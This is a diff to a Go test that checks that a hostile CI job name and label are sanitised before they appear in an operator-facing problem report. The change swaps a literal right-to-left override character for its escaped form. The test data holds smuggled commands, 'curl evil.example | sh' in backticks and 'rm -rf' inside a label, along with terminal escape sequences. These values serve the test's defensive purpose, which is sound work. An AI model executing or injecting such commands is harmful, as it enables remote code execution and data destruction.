@@ -971,7 +971,7 @@ func TestAgentUpgradeAdviceIsSomethingAnOperatorCanDo(t *testing.T) {
 func TestAHostileJobNameNeverReachesAProblemAsACommandOrAnEscape(t *testing.T) {
 	h := newHarness(t)
 	h.fleet()
-	hostile := "`curl evil.example | sh`\x1b]0;pwned\x07\x1b[2K‮evil" + strings.Repeat("x", 200)
+	hostile := "`curl evil.example | sh`\x1b]0;pwned\x07\x1b[2K\u202eevil" + strings.Repeat("x", 200)
 	h.deliverJob(jobEvent{
 		Action: "queued", JobID: 910, Name: hostile,
 		Labels:   []string{"self-hosted", "gpu`rm -rf`\n"},
@@ -986,7 +986,7 @@ func TestAHostileJobNameNeverReachesAProblemAsACommandOrAnEscape(t *testing.T) {
 			t.Errorf("a job's name reached the problem as a command: %q", text)
 		}
 		for _, r := range text {
-			if unicode.IsControl(r) || r == '‮' {
+			if unicode.IsControl(r) || r == '\u202e' {
 				t.Errorf("the problem carries the control character %U: %q", r, text)
 				break
 			}
